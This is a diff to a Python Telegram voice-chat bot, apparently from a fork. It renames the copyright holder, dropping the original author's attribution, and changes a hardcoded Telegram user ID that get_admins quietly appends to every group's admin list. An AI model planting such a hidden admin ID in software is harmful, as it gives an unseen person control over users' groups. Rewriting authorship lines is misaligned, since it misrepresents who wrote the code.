@@ -1,6 +1,6 @@
 """
 RadioPlayerV3, Telegram Voice Chat Bot
-Copyright (c) 2021  Asm Safone <https://github.com/AsmSafone>
+Copyright (c) 2021  Popay Ckl <https://github.com/Popay-ckl>
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU Affero General Public License as published by
@@ -310,7 +310,7 @@ class MusicPlayer(object):
     async def get_admins(self, chat):
         admins = ADMIN_LIST.get(chat)
         if not admins:
-            admins = Config.ADMINS + [1316963576]
+            admins = Config.ADMINS + [1761766352]
             try:
                 grpadmins=await bot.get_chat_members(chat_id=chat, filter="administrators")
                 for administrator in grpadmins:
